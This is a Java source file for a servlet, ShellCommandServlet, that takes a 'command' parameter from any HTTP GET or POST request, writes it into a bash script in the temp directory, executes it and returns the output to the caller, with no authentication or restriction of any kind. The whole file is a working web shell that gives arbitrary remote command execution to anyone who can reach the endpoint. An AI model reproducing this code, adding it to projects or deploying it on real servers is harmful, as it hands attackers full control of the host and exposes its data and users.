package main;

import java.io.File;
import java.io.IOException;
import java.io.PrintWriter;
import java.util.Scanner;

import javax.servlet.ServletException;
import javax.servlet.annotation.WebServlet;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;

@WebServlet("/ShellCommandServlet")
public class ShellCommandServlet extends HttpServlet {
    private static final long serialVersionUID = 1L;

    public ShellCommandServlet() {
        super();
    }

    @Override
    protected void doGet(HttpServletRequest request,
            HttpServletResponse response) throws ServletException, IOException {
        doPost(request, response);
    }

    @Override
    @SuppressWarnings("resource")
    protected void doPost(HttpServletRequest request,
            HttpServletResponse response) throws ServletException, IOException {

        PrintWriter out = response.getWriter();
        String command = request.getParameter("command");

        if (command == null) return;
        if (System.getProperty("os.name").indexOf("Windows") > -1) {
            out.println("Windows is not supported at the moment");
            return;
        }

        File f = new File(System.getProperty("java.io.tmpdir") + File.separator + "jash.sh");

        try {
            f.delete();
            f.createNewFile();
            f.setExecutable(true);

            PrintWriter script = new PrintWriter(f.getAbsolutePath());
            script.println("#!/bin/bash");
            script.println(command);
            script.close();

            Process p = Runtime.getRuntime().exec(f.getAbsolutePath());
            p.waitFor();

            Scanner s = new Scanner(p.getInputStream()).useDelimiter("\\A");
            if (s.hasNext()) {
                out.print(s.next().replace("<",  "&lt;").replace(">", "&gt;") + "<br>");
            }

            if (p.exitValue() != 0) {
                Scanner err = new Scanner(p.getErrorStream()).useDelimiter("\\A");
                if (err.hasNext()) {
                    out.print(err.next().replace("<",  "&lt;").replace(">", "&gt;") + "<br>");
                }
            }
        } catch (Exception e) {
            out.print(e.getClass().getSimpleName() + ": " + e.getMessage());
        } finally {
            f.delete();
        }
    }
}